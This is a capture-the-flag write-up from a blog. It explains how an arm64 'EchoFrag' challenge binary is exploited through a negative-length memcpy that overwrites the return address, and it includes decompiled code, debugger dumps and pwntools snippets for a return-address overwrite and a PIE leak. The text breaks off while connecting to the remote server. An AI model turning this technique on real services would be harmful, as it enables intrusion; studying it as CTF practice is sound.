<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>SSTF CTF 2021 - EchoFrag | kileak</title>





<meta name="description" content="SSTF CTF 2021 - EchoFrag">


<meta name="keywords" content="sstf, echofrag">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2021/sstf-echofrag/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">SSTF CTF 2021 - EchoFrag</h1>
      <p class="post-meta">Aug 17, 2021</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>EchoFrag
<!--break--></p>

  <p>Description</p>

  <p>I made a echo server to practice network fragmentation!
Could you test that implementation of fragmentation was working correctly?</p>

  <p>echofrag.sstf.site:31513</p>

  <p>Attachment: <a href="https://kileak.github.io/assets/sstf21/echofrag/EchoFrag">EchoFrag</a> <a href="https://kileak.github.io/assets/sstf21/echofrag/xpl.py">xpl.py</a></p>

  <p>Team: Super Guesser</p>
</blockquote>

<p>EchoFrag was an arm binary, that reads an input package, and depending on the type, it will either just echo the input back or store it into an <code class="language-plaintext highlighter-rouge">echo buffer</code>, which it will echo back when it’s <code class="language-plaintext highlighter-rouge">full</code>.</p>

<p>The package we have to send looks like</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">Buffer</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">Type</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">Size</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">Data</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">handle_server</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">signed</span> <span class="kt">int</span> <span class="n">cur_echo_off</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">read_len</span><span class="p">;</span>
    <span class="kt">signed</span> <span class="kt">int</span> <span class="n">echo_off</span><span class="p">;</span>
    <span class="kt">signed</span> <span class="kt">int</span> <span class="n">echo_size</span><span class="p">;</span>

    <span class="n">Buffer</span> <span class="n">echo_buffer</span><span class="p">;</span>
    <span class="n">Buffer</span> <span class="n">input_buffer</span><span class="p">;</span>

    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">echo_buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x203</span><span class="p">);</span>

    <span class="n">cur_echo_off</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// Read package</span>
        <span class="n">read_len</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input_buffer</span><span class="p">,</span> <span class="mh">0x203</span><span class="p">);</span>

        <span class="c1">// Read package len must be &gt;= 3</span>
        <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">read_len</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">read_len</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">)</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>

        <span class="c1">// Type 1: Unbuffered echo</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">input_buffer</span><span class="p">.</span><span class="n">Type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">input_buffer</span><span class="p">.</span><span class="n">Size</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">&gt;</span> <span class="mh">0x203</span><span class="p">)</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">3</span><span class="p">;</span>

            <span class="c1">// If buffer size is smaller than read bytes, echo it back</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">input_buffer</span><span class="p">.</span><span class="n">Size</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">&lt;=</span> <span class="n">read_len</span><span class="p">)</span>
                <span class="n">do_write</span><span class="p">(</span><span class="o">&amp;</span><span class="n">input_buffer</span><span class="p">);</span>

            <span class="c1">// Copy input buffer over echo_buffer (This will overwrite the size of echo_buffer!)</span>
            <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">echo_buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input_buffer</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">read_len</span><span class="p">);</span>

            <span class="n">cur_echo_off</span> <span class="o">=</span> <span class="n">read_len</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="c1">// Type 2: Buffered echo</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="c1">// Find current offset in echo buffer to write to</span>
            <span class="n">echo_off</span> <span class="o">=</span> <span class="n">cur_echo_off</span> <span class="o">+</span> <span class="n">read_len</span> <span class="o">-</span> <span class="mi">3</span><span class="p">;</span> 
            <span class="n">echo_size</span> <span class="o">=</span> <span class="n">echo_buffer</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>           

            <span class="k">if</span> <span class="p">(</span><span class="n">echo_off</span> <span class="o">&gt;</span> <span class="n">echo_buffer</span><span class="p">.</span><span class="n">size</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">read_len</span> <span class="o">=</span> <span class="n">echo_buffer</span><span class="p">.</span><span class="n">size</span> <span class="o">-</span> <span class="n">cur_echo_off</span><span class="p">;</span>
                <span class="n">echo_off</span> <span class="o">=</span> <span class="n">echo_buffer</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="c1">// Copy data from input_buffer into echo_buffer</span>
            <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">echo_buffer</span><span class="p">.</span><span class="n">field_0</span> <span class="o">+</span> <span class="n">cur_echo_off</span><span class="p">,</span> <span class="n">input_buffer</span><span class="p">.</span><span class="n">Data</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">read_len</span> <span class="o">-</span> <span class="mi">3</span><span class="p">));</span>
            
            <span class="n">cur_echo_off</span> <span class="o">=</span> <span class="n">echo_off</span><span class="p">;</span>

            <span class="c1">// If current offset in echo buffer is bigger than echo buffer size, echo it back</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">echo_off</span> <span class="o">&gt;=</span> <span class="n">echo_size</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">cur_echo_off</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
                <span class="n">do_write</span><span class="p">(</span><span class="o">&amp;</span><span class="n">echo_buffer</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">do_write</span><span class="p">(</span><span class="n">Buffer</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">a1</span><span class="o">-&gt;</span><span class="n">Data</span><span class="p">,</span> <span class="n">a1</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">-</span> <span class="mi">3</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Some things to note here</p>

<ul>
  <li>When sending a package with type 1, the input package will be copied into <code class="language-plaintext highlighter-rouge">echo_buffer</code> (effectively overwriting its <code class="language-plaintext highlighter-rouge">size</code> with the one from the input package)</li>
  <li>When sending a package with type 2, only the data from the input package will be copied at the current offset (<code class="language-plaintext highlighter-rouge">cur_echo_off</code>) in the <code class="language-plaintext highlighter-rouge">echo_buffer</code> and increase the offset by the data size.</li>
  <li>When the offset would exceed the limit of the echo buffer, <code class="language-plaintext highlighter-rouge">read_len</code> will be limited to the remaining space in the buffer, so that it cannot be overflown.</li>
  <li>When the current offset equals the size of the echo buffer, it will be printed back.</li>
</ul>

<p>Let’s see how this looks on the stack</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x5501812890:	0x0000005500000c58	0x0000005501812af0
0x55018128a0:	0x0000005501812920	0x000000fd018148a4
0x55018128b0:	0x0000005501812d00	0x0000005500000c48 &lt;= X / Return address 
0x55018128c0:	0x0000005501843a18	0x0000000301812e50
0x55018128d0:	0x0000005500000103	0x0000005500000000 &lt;= X / cur_echo_off / read_len / echo_off
0x55018128e0:	0x0000010300000000	0x4141414141010001 &lt;= echo_size (32bit) / Echo Buffer Start (Type/Size/Data)
0x55018128f0:	0x4141414141414141	0x4141414141414141
0x5501812900:	0x4141414141414141	0x4141414141414141
0x5501812910:	0x4141414141414141	0x4141414141414141
0x5501812920:	0x4141414141414141	0x4141414141414141
0x5501812930:	0x4141414141414141	0x4141414141414141
0x5501812940:	0x4141414141414141	0x4141414141414141
0x5501812950:	0x4141414141414141	0x4141414141414141
0x5501812960:	0x4141414141414141	0x4141414141414141
0x5501812970:	0x4141414141414141	0x4141414141414141
0x5501812980:	0x4141414141414141	0x4141414141414141
0x5501812990:	0x4141414141414141	0x4141414141414141
0x55018129a0:	0x4141414141414141	0x4141414141414141
0x55018129b0:	0x4141414141414141	0x4141414141414141
0x55018129c0:	0x4141414141414141	0x4141414141414141
0x55018129d0:	0x4141414141414141	0x4141414141414141
0x55018129e0:	0x4141414141414141	0x0000000000414141
0x55018129f0:	0x0000000000000000	0x0000000000000000
0x5501812a00:	0x0000000000000000	0x0000000000000000
0x5501812a10:	0x0000000000000000	0x0000000000000000
0x5501812a20:	0x0000000000000000	0x0000000000000000
0x5501812a30:	0x0000000000000000	0x0000000000000000
0x5501812a40:	0x0000000000000000	0x0000000000000000
0x5501812a50:	0x0000000000000000	0x0000000000000000
0x5501812a60:	0x0000000000000000	0x0000000000000000
0x5501812a70:	0x0000000000000000	0x0000000000000000
0x5501812a80:	0x0000000000000000	0x0000000000000000
0x5501812a90:	0x0000000000000000	0x0000000000000000
0x5501812aa0:	0x0000000000000000	0x0000000000000000
0x5501812ab0:	0x0000000000000000	0x0000000000000000
0x5501812ac0:	0x0000000000000000	0x0000000000000000
0x5501812ad0:	0x0000000000000000	0x0000000000000000
0x5501812ae0:	0x0000000000000000	0x0000000000000000
0x5501812af0:	0x4141414141010001	0x4141414141414141 &lt;= Input buffer start
0x5501812b00:	0x4141414141414141	0x4141414141414141
0x5501812b10:	0x4141414141414141	0x4141414141414141
0x5501812b20:	0x4141414141414141	0x4141414141414141
0x5501812b30:	0x4141414141414141	0x4141414141414141
0x5501812b40:	0x4141414141414141	0x4141414141414141
0x5501812b50:	0x4141414141414141	0x4141414141414141
0x5501812b60:	0x4141414141414141	0x4141414141414141
0x5501812b70:	0x4141414141414141	0x4141414141414141
0x5501812b80:	0x4141414141414141	0x4141414141414141
0x5501812b90:	0x4141414141414141	0x4141414141414141</code></pre></figure>

<p>So from a first glance, it seems, that we cannot write data outside of those two buffers. But while playing around with some test data and lengths, the binary suddenly crashed in the <code class="language-plaintext highlighter-rouge">memcpy</code> into the <code class="language-plaintext highlighter-rouge">echo_buffer</code>.</p>

<p>This arised, because I didn’t send a package type 1, which would have initialized the size of <code class="language-plaintext highlighter-rouge">echo_buffer</code> (which is in the beginning just 0).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">echo_off</span> <span class="o">=</span> <span class="n">cur_echo_off</span> <span class="o">+</span> <span class="n">read_len</span> <span class="o">-</span> <span class="mi">3</span><span class="p">;</span>           <span class="c1">// echo_off = 3 + read bytes -3 = read_bytes</span>
<span class="n">echo_size</span> <span class="o">=</span> <span class="n">echo_buffer</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>                     <span class="c1">// echo_size = 0</span>

<span class="k">if</span> <span class="p">(</span><span class="n">echo_off</span> <span class="o">&gt;</span> <span class="n">echo_buffer</span><span class="p">.</span><span class="n">size</span><span class="p">)</span>                  <span class="c1">// will always be true for zero size buffer</span>
<span class="p">{</span>
    <span class="n">read_len</span> <span class="o">=</span> <span class="n">echo_buffer</span><span class="p">.</span><span class="n">size</span> <span class="o">-</span> <span class="n">cur_echo_off</span><span class="p">;</span>   <span class="c1">// read_len = 0 - last read byte count (will be negative)</span>
    <span class="n">echo_off</span> <span class="o">=</span> <span class="n">echo_buffer</span><span class="p">.</span><span class="n">size</span>                   <span class="c1">// echo_off = 0</span>
<span class="p">}</span>

<span class="c1">// Copy data from input_buffer into echo_buffer</span>
<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">echo_buffer</span><span class="p">.</span><span class="n">field_0</span> <span class="o">+</span> <span class="n">cur_echo_off</span><span class="p">,</span> <span class="n">input_buffer</span><span class="p">.</span><span class="n">Data</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">read_len</span> <span class="o">-</span> <span class="mi">3</span><span class="p">));</span>
            
<span class="c1">// Store echo_off back into cur_echo_off</span>
<span class="n">cur_echo_off</span> <span class="o">=</span> <span class="n">echo_off</span><span class="p">;</span></code></pre></figure>

<p>Since the now negative <code class="language-plaintext highlighter-rouge">read_len</code> is casted to <code class="language-plaintext highlighter-rouge">int</code>, <code class="language-plaintext highlighter-rouge">memcpy</code> will be called with a size of <code class="language-plaintext highlighter-rouge">-6</code></p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">───────────────────────────────────────────────────────────────────────────────────── registers ────
$x0  : 0x00000055018128eb  →  0x0000000000000000  →  0x0000000000000000
$x1  : 0x0000005501812af3  →  0x0000004242424242  →  0x0000004242424242
$x2  : 0xfffffffffffffffa  →  0xfffffffffffffffa
$x3  : 0x00000055018128eb  →  0x0000000000000000  →  0x0000000000000000
$x4  : 0x0000005501812af3  →  0x0000004242424242  →  0x0000004242424242
....
$sp  : 0x00000055018128b0  →  0x0000005501812d00  →  0x0000005501812d10  →  0x0000000000000000  →  0x0000000000000000
$pc  : 0x0000005500000bc4  →  0xb94027a097ffff17  →  0xb94027a097ffff17
$cpsr: [negative zero CARRY overflow interrupt fast]
$fpsr: 0x0000000000000000  →  0x0000000000000000
$fpcr: 0x0000000000000000  →  0x0000000000000000
──────────────────────────────────────────────────────────────────────────────── code:arm64:ARM ────
   0x5500000bb8                  mov    x2,  x0
   0x5500000bbc                  mov    x1,  x4
   0x5500000bc0                  mov    x0,  x3
 → 0x5500000bc4                  bl     0x5500000820 &lt;memcpy@plt&gt;
   ↳  0x5500000820 &lt;memcpy@plt+0&gt;   adrp   x16,  0x5500010000
      0x5500000824 &lt;memcpy@plt+4&gt;   ldr    x17,  [x16,  #3920]
      0x5500000828 &lt;memcpy@plt+8&gt;   add    x16,  x16,  #0xf50
      0x550000082c &lt;memcpy@plt+12&gt;  br     x17
      0x5500000830 &lt;setbuf@plt+0&gt;   adrp   x16,  0x5500010000
      0x5500000834 &lt;setbuf@plt+4&gt;   ldr    x17,  [x16,  #3928]
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00000055018128b0│+0x0000: 0x0000005501812d00  →  0x0000005501812d10  →  0x0000000000000000  →  0x0000000000000000	 ← $x29, $sp
0x00000055018128b8│+0x0008: 0x0000005500000c48  →  0xa8c17bfd52800000  →  0xa8c17bfd52800000
0x00000055018128c0│+0x0010: 0x0000005501843a18  →  0x0000005501813000  →  0x00010102464c457f  →  0x00010102464c457f
0x00000055018128c8│+0x0018: 0x0000000301812e50  →  0x0000000301812e50
0x00000055018128d0│+0x0020: 0x00000000fffffffd  →  0x00000000fffffffd
0x00000055018128d8│+0x0028: 0x0000000300000000  →  0x0000000300000000
─────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
memcpy@plt (
   $x0 = 0x00000055018128eb → 0x0000000000000000 → 0x0000000000000000,
   $x1 = 0x0000005501812af3 → 0x0000004242424242 → 0x0000004242424242,
   $x2 = 0xfffffffffffffffa → 0xfffffffffffffffa
)</code></pre></figure>

<p>This should copy our <code class="language-plaintext highlighter-rouge">input_buffer</code> (<code class="language-plaintext highlighter-rouge">0x0000005501812af3</code>) into the <code class="language-plaintext highlighter-rouge">echo_buffer</code> (<code class="language-plaintext highlighter-rouge">0x00000055018128eb</code>). Let’s check the memory around the <code class="language-plaintext highlighter-rouge">echo_buffer</code> before <code class="language-plaintext highlighter-rouge">memcpy</code> is executed.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x00000055018128eb-0x4b
0x55018128a0:	0x0000005501812920	0x00000055018148a4
0x55018128b0:	0x0000005501812d00	0x0000005500000c48 &lt;= X / return address
0x55018128c0:	0x0000005501843a18	0x0000000301812e50
0x55018128d0:	0x00000000fffffffd	0x0000000300000000
0x55018128e0:	0x0000000000000000	0x0000000000000000 &lt;= echo_size (32bit) / Echo Buffer Start (Type/Size/Data)
0x55018128f0:	0x0000000000000000	0x0000000000000000
0x5501812900:	0x0000000000000000	0x0000000000000000
0x5501812910:	0x0000000000000000	0x0000000000000000
0x5501812920:	0x0000000000000000	0x0000000000000000
0x5501812930:	0x0000000000000000	0x0000000000000000
0x5501812940:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>And now, after the <code class="language-plaintext highlighter-rouge">memcpy</code> with its huge (negative) size was executed.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x00000055018128eb-0x4b
0x55018128a0:	0x0000005501812920	0x0000000000000000
0x55018128b0:	0x0000000000000000	0x0000000000000000 &lt;= X / return address
0x55018128c0:	0x0000000000000000	0x0000000000000000
0x55018128d0:	0x0000000000000000	0x0000000000000000
0x55018128e0:	0x0000000000000000	0x4242424242000000 &lt;= echo_size (32bit) / Echo Buffer Start (Type/Size/Data)
0x55018128f0:	0x0000000000000000	0x0000000000000000
0x5501812900:	0x0000000000000000	0x0000005501842ed0
0x5501812910:	0x0000000000000000	0x0000000000000000
0x5501812920:	0x0000000000000000	0x0000000000000000
0x5501812930:	0x0000000000000000	0x0000000000000000
0x5501812940:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>Uh oh, it seems <code class="language-plaintext highlighter-rouge">memcpy</code> has kinda overflown its offset while copying the data and also overwritten the data <em>before</em> the <code class="language-plaintext highlighter-rouge">echo_buffer</code> overwriting our state stack variables and even the return address of the function itself.</p>

<p>Let’s see, if we can control that overflown data.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># prepare payload
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x200</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>

<span class="c1"># prepare size of echo_buffer to do a valid copy
</span><span class="n">pkg1</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
	
<span class="c1"># copy payload into echo_buffer (with valid size)
</span><span class="n">pkg2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># overwrite echo buffer size with 0
</span><span class="n">pkg1</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>

<span class="c1"># trigger negative memcpy
</span><span class="n">pkg2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span></code></pre></figure>

<p>This will first do a valid copy into echo buffer with our payload, then overwrite the size of the echo buffer with <code class="language-plaintext highlighter-rouge">0</code> and trigger the negative <code class="language-plaintext highlighter-rouge">memcpy</code>.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x00000055018128eb-0x4b
0x55018128a0:	0x3070415501812920	0x7041327041317041
0x55018128b0:	0x4135704134704133	0x3870413770413670 &lt;= X / return address
0x55018128c0:	0x7141307141397041	0x4133714132714131
0x55018128d0:	0x3671413571413471	0x0000000000377141
0x55018128e0:	0x0000000000000000	0x6141306141000001 &lt;= echo_size (32bit) / Echo Buffer Start (Type/Size/Data)
0x55018128f0:	0x4133614132614131	0x3661413561413461
0x5501812900:	0x6141386141376141	0x4131624130624139
0x5501812910:	0x3462413362413262	0x6241366241356241
0x5501812920:	0x4139624138624137	0x3263413163413063
0x5501812930:	0x6341346341336341	0x4137634136634135
0x5501812940:	0x3064413963413863	0x6441326441316441
0x5501812950:	0x4135644134644133	0x3864413764413664
0x5501812960:	0x6541306541396441	0x4133654132654131
0x5501812970:	0x3665413565413465	0x6541386541376541
0x5501812980:	0x4131664130664139	0x3466413366413266</code></pre></figure>

<p>Ok, so we can overwrite the return address with our input. At this point, this <em>could</em> have been finished already, since the addresses in the binary will always be fixed…</p>

<p>But I was kinda tired at that point and just wrote a payload, which gave me a local shell, but didn’t work remote…</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># prepare payload
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">469</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x5500000A28</span><span class="p">)</span>
	
<span class="c1"># prepare size of echo_buffer to do a valid copy
</span><span class="n">pkg1</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
	
<span class="c1"># copy payload into echo_buffer (with valid size)
</span><span class="n">pkg2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	
<span class="c1"># overwrite echo buffer size with 0
</span><span class="n">pkg1</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>

<span class="n">pkg2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
	
<span class="k">print</span><span class="p">(</span><span class="s">"Enter to trigger shell"</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python writeup.py 
[+] Starting local process '/usr/bin/qemu-aarch64': pid 17329
[17329]
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
Enter to trigger shell
[*] Switching to interactive mode
$ 
$ ls
EchoFrag
xpl.py
$  </code></pre></figure>

<p>Yep, shell working, let’s just grab the flag… But the exploit crashed remote all the time…</p>

<p>Spoiler: I used <code class="language-plaintext highlighter-rouge">0x5500000000</code> as base address, which it is in my local qemu env, but remote the base address was <code class="language-plaintext highlighter-rouge">0x4000000000</code> (but also static).</p>

<p>At that point, I made a dreadful decision:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ checksec ./EchoFrag
[*] '/home/kileak/ctf/ssf/echofrag/EchoFrag'
    Arch:     aarch64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled</code></pre></figure>

<p>Ah, sure, <code class="language-plaintext highlighter-rouge">PIE enabled</code>, I have to leak an address and calculate the base address…</p>

<p>Getting a leak took a lot more time, than the complete exploit itself, though :(</p>

<p>I’ll not get too much into detail, on how the <code class="language-plaintext highlighter-rouge">memcpy</code>s will do this, but the idea is to overwrite <code class="language-plaintext highlighter-rouge">echo_buffer.size</code> with a very big value and trigger the <code class="language-plaintext highlighter-rouge">echo</code>, so that it will just print out everything also behind <code class="language-plaintext highlighter-rouge">input_buffer</code> where some pie addresses were stored.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># leak		
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">489</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>	
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"C"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>

<span class="c1"># overwrite echo buffer size	
</span><span class="n">pkg1</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>

<span class="c1"># copy payload into echo buffer
</span><span class="n">pkg2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># reset echo buffer size to 0
</span><span class="n">pkg1</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>

<span class="c1"># trigger negative memcpy overwriting buffer state variables
</span><span class="n">pkg2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"XXXX"</span><span class="p">)</span>			

<span class="c1"># trigger negative memcpy again to overwrite current offset of echo buffer
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x10101010</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x20202020</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>

<span class="n">pkg2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>		

<span class="c1"># trigger negative memcpy again to overwrite echo buffer size with 0x600 and trigger echo
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">+</span><span class="n">p16</span><span class="p">(</span><span class="mh">0x600</span><span class="p">)</span><span class="o">+</span><span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
<span class="n">pkg2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>	
	
<span class="c1"># read echo buffer[0:0x600]
</span><span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x5f0</span><span class="p">)</span>
	
<span class="c1"># get PIE from leaked data
</span><span class="n">PIE</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">LEAK</span><span class="p">[</span><span class="mh">0x445</span><span class="p">:</span><span class="mh">0x445</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
<span class="n">BASE</span> <span class="o">=</span> <span class="n">PIE</span> <span class="o">-</span> <span class="mh">0x8e0</span>
	
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIE</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"BASE   : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BASE</span><span class="p">))</span></code></pre></figure>

<p>This took way longer than expected, but with this finally armed, I wanted to see how the remote addresses looked like.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Opening connection to echofrag.sstf.site on port 31513: Done
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
